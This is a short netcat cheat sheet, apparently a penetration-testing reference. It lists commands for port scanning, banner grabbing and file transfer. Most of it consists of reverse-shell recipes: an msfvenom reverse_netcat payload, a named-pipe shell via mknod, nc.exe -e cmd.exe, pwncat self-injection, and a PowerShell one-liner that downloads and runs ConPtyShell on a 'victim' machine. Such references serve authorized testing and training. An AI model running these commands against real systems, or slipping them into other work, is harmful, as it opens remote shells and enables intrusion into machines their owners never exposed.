

Port scanning :
```bash
nc -vnz 192.168.1.105 21-100  # quickly identify open  ports in target system.
nc -vzu 192.168.1.105 161  #for UDP ports
```


Chatting :
```bash
nc -lnvp 1234 #listner
nc 192.168.1.109 1234 #client
```

Banner grabbing:
```bash
nc 192.168.1.105 21 
nc 192.168.1.105 22
```

File Transfer:
```bash
nc -lvnp 5555 < file.txt                 #listener
nc 192.168.1.109 5555 > file.txt  #client 
```

uing msfvenom:
```bash
msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.109 lport=6666 R #payload generator #start the listener in attacker machine.
```

security bypass using mknod:
```bash
#run ingtarget machine
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc 192.168.1.109 443 1>/tmp/backpipe
```


random port generate:
```bash
nc -lv –r
```

http server banner :
```bash
printf "GET / HTTP/1.0\r\n\r\n" | nc 192.168.154.132 80 | head -n 30
```

reverse shell :
```bash
nc -nvlp 4444 #server listener
nc.exe 192.168.1.109 4444 -e cmd.exe #client connect
```


Advance enhancement with netcat or alternative :
```bash
rlwrap nc -lvnp 4444
rcat listen -ib 1234
pwncat -l 1234 --self-inject /bin/bash:192.168.1.7:1234
```


Windows tty shell :
```bash
#victum system
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.154.132 5555

#attackker system
stty raw -echo; (stty size; cat) | nc -lvnp 5555
```